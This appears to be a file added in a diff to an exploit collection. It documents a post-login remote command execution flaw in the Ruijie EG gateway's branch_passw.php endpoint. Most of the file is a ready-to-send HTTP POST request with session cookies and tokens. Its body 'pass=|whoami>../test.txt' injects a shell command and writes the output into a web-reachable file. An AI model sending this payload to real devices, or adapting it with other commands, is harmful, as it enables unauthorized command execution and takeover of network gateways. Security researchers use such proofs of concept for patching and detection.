@@ -1,0 +1,11 @@
+# 锐捷EG易网关后台branch_passw远程代码执行
+# 锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷EG易网关系统存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。该漏洞需要一定权限先登录到系统中去。
+POST /itbox_pi/branch_passw.php?a=set&acid=80002178&bid=hd_tag_m8mv25j9 HTTP/1.1
+Host: www.swaf.com
+Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=e2iuc40kc25v8bosaf04ee7273; user=admin; helpKey=home_sys
+RM-PRO-BusinessID: hd_tag_m8mv25j9
+RM-PRO-Token: f46a1d31736d93665d94856efd12be87
+RM-PRO-Time: 1742808472337
+User-Agent: curl/7.83.1
+
+pass=|whoami>../test.txt
